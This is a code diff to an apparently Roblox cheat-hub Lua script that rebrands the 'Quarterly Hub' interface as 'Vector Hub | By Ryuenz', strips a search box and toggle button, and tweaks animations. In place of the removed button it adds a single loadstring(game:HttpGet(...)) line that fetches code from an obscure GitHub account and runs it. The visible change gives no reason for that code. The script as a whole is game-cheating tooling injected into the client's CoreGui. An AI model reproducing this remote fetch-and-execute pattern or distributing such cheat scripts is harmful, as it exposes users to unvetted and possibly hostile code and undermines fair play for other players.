@@ -203,47 +203,7 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 	local Mouse = LocalPlayer:GetMouse()
 	local GuiService = game:GetService("GuiService")
 	
-	local ScreenGui = Instance.new("ScreenGui")
-	local ImageButton = Instance.new("ImageButton")
-	local UICorner = Instance.new("UICorner")
-	
-	ScreenGui.Name = "Q"
-	ScreenGui.Parent = game.CoreGui
-	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	
-	ImageButton.Parent = ScreenGui
-	ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	ImageButton.BorderSizePixel = 0
-	ImageButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
-	ImageButton.Size = UDim2.new(0, 70, 0, 70)
-	ImageButton.Draggable = true
-	ImageButton.Image = "rbxassetid://14300572370"
-	ImageButton.MouseButton1Down:connect(function()
-		game:GetService("VirtualInputManager"):SendKeyEvent(true,305,false,game)
-		game:GetService("VirtualInputManager"):SendKeyEvent(false,305,false,game)
-		local SoundClick = Instance.new("Sound")
-		SoundClick.Name = "SoundEffect"
-		SoundClick.SoundId = "rbxassetid://130785805"
-		SoundClick.Volume = 1
-		SoundClick.Parent = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-		TweenService:Create(
-			ImageButton,
-			TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-			{Size = UDim2.new(0, 75, 0, 75)}
-		):Play()
-		SoundClick:Play()
-		wait(.2)
-		TweenService:Create(
-			ImageButton,
-			TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-			{Size = UDim2.new(0, 70, 0, 70)}
-		):Play()
-		SoundClick:Destroy()
-	end)
-	
-	UICorner.Parent = ImageButton
-	UICorner.CornerRadius = UDim.new(0, 100)
-
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/SSDAWGDFHTEHVFFSGXCVBSDFBFDGWGSDVDDSXC/d/main/perpid"))()
 	local function tablefound(ta, object)
 		for i,v in pairs(ta) do
 			if v == object then
@@ -470,7 +430,7 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 		)
 	end
 	
-	local UIConfig = {Bind = Enum.KeyCode.RightControl}
+	local UIConfig = {Bind = Enum.KeyCode.F1}
 	local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	local length = 20
 	local randomString = ""
@@ -646,7 +606,7 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 		Logo.Position = UDim2.new(0, 10, 0, 10)
 		Logo.Size = UDim2.new(0, 30, 0, 30)
 		Logo.ImageTransparency = 0
-		Logo.Image = "rbxassetid://14284996066"
+		Logo.Image = "rbxassetid://14645512457"
 	
 		Logo_Background.Name = "Logo"
 		Logo_Background.Parent = Main
@@ -654,19 +614,25 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 		Logo_Background.AnchorPoint = Vector2.new(0,0)
 		Logo_Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		Logo_Background.BackgroundTransparency = 1.000
-		Logo_Background.Position = UDim2.new(0, 10, 0, 10)
-		Logo_Background.Size = UDim2.new(0, 585, 0, 435)
-		Logo_Background.ImageTransparency = 0.5
-		Logo_Background.Image = "rbxassetid://14284996066"
-	
+		Logo_Background.Position = UDim2.new(0, 135, 0, 75)
+		Logo_Background.Size = UDim2.new(0, 305, 0, 335)
+		Logo_Background.ImageTransparency = 0.7
+		Logo_Background.Image = "rbxassetid://14645512457"
+		local RunService = game:GetService("RunService")
+		RunService.RenderStepped:Connect(function()
+			Logo_Background.Rotation = Logo_Background.Rotation + 1 -- หมุน 1 องศาต่อเฟรม
+			if Logo_Background.Rotation >= 360 then
+				Logo_Background.Rotation = 0 -- รีเซ็ตการหมุนกลับเป็น 0 เมื่อครบ 360 องศา
+			end
+		end)
 		Title.Name = "Title"
 		Title.Parent = Main
 		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		Title.BackgroundTransparency = 1.000
 		Title.Position = UDim2.new(0, 45, 0, 10)
 		Title.Size = UDim2.new(0, 483, 0, 31)
-		Title.Font = Enum.Font.GothamMedium
-		Title.Text = "Quarterly"
+		Title.Font = Enum.Font.FredokaOne
+		Title.Text = "Vector"
 		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 		Title.TextSize = 17.000
 		Title.TextWrapped = true
@@ -677,73 +643,20 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 		Title2.Parent = Main
 		Title2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		Title2.BackgroundTransparency = 1.000
-		Title2.Position = UDim2.new(0, 125, 0, 10)
+		Title2.Position = UDim2.new(0, 95, 0, 10)
 		Title2.Size = UDim2.new(0, 483, 0, 31)
-		Title2.Font = Enum.Font.GothamMedium
-		Title2.Text = "Hub | Premium Script"
+		Title2.Font = Enum.Font.FredokaOne
+		Title2.Text = "Hub | By Ryuenz#6264"
 		Title2.TextColor3 = _G.Color
 		Title2.TextSize = 17.000
 		Title2.TextWrapped = true
 		Title2.TextXAlignment = Enum.TextXAlignment.Left
 	
-		local search = Instance.new("ImageButton")
-		search.Name = "search"
-		search.Parent = Main
-		search.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-		search.BackgroundTransparency = 0
-		search.LayoutOrder = 1
-		search.Position = UDim2.new(0, 555, 0, 10)
-		search.Size = UDim2.new(0, 22, 0, 22)
-		search.ZIndex = 9
-		search.Image = "rbxassetid://3926305904"
-		search.ImageRectOffset = Vector2.new(964, 324)
-		search.ImageColor3 = Color3.fromRGB(0, 0, 0)
-		search.ImageRectSize = Vector2.new(36, 36)
-	
-		local UICorner_2222 = Instance.new("UICorner")
-		UICorner_2222.CornerRadius = UDim.new(0, 3)
-		UICorner_2222.Parent = search
-	
-		local SearchBox = Instance.new("TextBox")
-		SearchBox.Name = "SearchBox"
-		SearchBox.Parent = Main
-		SearchBox.BackgroundColor3 = Color3.fromRGB(23, 24, 25)
-		SearchBox.Size = UDim2.new(0, 0, 0, 15)
-		SearchBox.ZIndex = 10
-		SearchBox.BorderSizePixel = 0
-		SearchBox.Font = Enum.Font.SourceSans
-		SearchBox.PlaceholderColor3 = Color3.fromRGB(13, 14, 15)
-		SearchBox.PlaceholderText = "SearchBox..."
-		SearchBox.Text = ""
-		SearchBox.Position = UDim2.new(0, 10, 0, 5)
-		SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-		SearchBox.TextSize = 14.000
-		SearchBox.Visible = true
-		local SearchBoxTog = false
-		local KJKJ = true
-	
-		search.MouseButton1Click:Connect(function()
-			SearchBoxTog = not SearchBoxTog
-			TweenService:Create(SearchBox,TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = SearchBoxTog and UDim2.new(0, 535, 0, 35) or UDim2.new(0, 0, 0, 0)}):Play()
-			if KJKJ then
-				KJKJ = false
-				wait(0.2)
-				SearchBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
-				SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-			else
-				KJKJ = true
-				SearchBox.PlaceholderColor3 = Color3.fromRGB(13, 14, 15)
-				SearchBox.TextColor3 = Color3.fromRGB(13, 14, 15)
-			end
-		end)
-	
-		local UICorner_25 = Instance.new("UICorner")
-		UICorner_25.Parent = SearchBox
 	
 		local UiToggle_UiStroke1 = Instance.new("UIStroke")
 	
-		UiToggle_UiStroke1.Color = Color3.fromRGB(25,25,25)
-		UiToggle_UiStroke1.Thickness = 2
+		UiToggle_UiStroke1.Color = Color3.fromRGB(0, 86, 255)
+		UiToggle_UiStroke1.Thickness = 1
 		UiToggle_UiStroke1.Name = "UiToggle_UiStroke1"
 		UiToggle_UiStroke1.Parent = Main
 	
@@ -813,7 +726,7 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 			function(io, p)
 				if io.KeyCode == UIConfig.Bind then
 					if uitoggled == false then
-						Main:TweenSize(UDim2.new(0, 585, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, 0.4, true) wait(0.4) UI.Enabled = false
+						Main:TweenSize(UDim2.new(0, 585, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, 0.4, true) wait(0.2) UI.Enabled = false
 						uitoggled = true
 					else
 						UI.Enabled = true
@@ -987,37 +900,37 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 						if x.Name == "Tab" then
 							TweenService:Create(
 								x.TextLabel,
-								TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+								TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 								{TextColor3 = Color3.fromRGB(255, 255, 255)}
 							):Play()
 							TweenService:Create(
 								x.ImageLabel,
-								TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+								TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 								{ImageColor3 = Color3.fromRGB(255, 255, 255)}
 							):Play()
 							TweenService:Create(
 								x.ImageLabel,
-								TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+								TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 								{ImageTransparency = 0.2}
 							):Play()
 							TweenService:Create(
 								x.TextLabel,
-								TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+								TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 								{TextTransparency = 0.2}
 							):Play()
 							TweenService:Create(
 								x.FrameTab,
-								TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+								TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 								{Size = UDim2.new(0, 0, 0, 1)}
 							):Play()
 							for index, y in next, Bottom:GetChildren() do
 								TweenService:Create(
 									y,
-									TweenInfo.new(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
+									TweenInfo.new(0,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
 									{Position = UDim2.new(0,1500,0,0)}
 								):Play()
 							end
-							wait(0.1)
+							
 							for index, y in next, Bottom:GetChildren() do
 								y.Visible = false
 							end
@@ -1026,34 +939,34 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 					end
 					TweenService:Create(
 						TextLabel,
-						TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+						TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 						{TextColor3 = Color3.fromRGB(255, 255, 255)}
 					):Play()
 					TweenService:Create(
 						ImageLabel,
-						TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+						TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 						{ImageColor3 = Color3.fromRGB(255, 255, 255)}
 					):Play()
 					TweenService:Create(
 						ImageLabel,
-						TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+						TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 						{ImageTransparency = 0}
 					):Play()
 					TweenService:Create(
 						TextLabel,
-						TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+						TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 						{TextTransparency = 0}
 					):Play()
 					FrameTab.Visible = true
 					TweenService:Create(
 						FrameTab,
-						TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+						TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
 						{Size = UDim2.new(0, 50, 0, 1)}
 					):Play()
 					Page.Position = UDim2.new(0,0,0,1500)
 					TweenService:Create(
 						Page,
-						TweenInfo.new(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
+						TweenInfo.new(0,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
 						{Position = UDim2.new(0,0,0,0)}
 					):Play()
 					Page.Visible = true
@@ -1162,38 +1075,9 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 				end
 				)
 	
-				SearchBox.Focused:Connect(function()
-				
-				end)
-				SearchBox.FocusLost:Connect(function()
-				
-				end)
+	
 			
-				function UpdateInputOfSearchText()
-					local InputText = string.upper(SearchBox.Text)
-					
-					for _, button in pairs(SectionContainer:GetChildren()) do
-						if button:IsA("Frame") then
-							if InputText == "" or string.find(string.upper(button.Name), InputText) ~= nil then
-								button.Visible = true
-							else
-								button.Visible = false
-							end
-						end
-					end
-					--[[for _, button in pairs(Bottom:GetDescendants()) do
-						if button:IsA("Frame") then
-							if InputText == "" or string.find(string.upper(button.Name), InputText) ~= nil then
-								button.Visible = true
-							else
-								button.Visible = false
-							end
-						end
-					end]]
-				end
-				
-			
-				SearchBox.Changed:Connect(UpdateInputOfSearchText)
+		
 	
 				local functionitem = {}
 	
@@ -1244,7 +1128,7 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 					end
 					return textas
 				end
-
+	
 				function functionitem:AddLabel(options)
 					text = options.Name
 					Flag = options.Flag
@@ -1899,7 +1783,7 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
 					Scroll_Items.Size = UDim2.new(1, 0, 0, 375)
 					Scroll_Items.CanvasSize = UDim2.new(0, 0, 0, 0)
 					Scroll_Items.ScrollBarThickness = 0
-
+	
 					UIListLayout_3.Parent = Scroll_Items
 					UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
 					UIListLayout_3.Padding = UDim.new(0, 5)
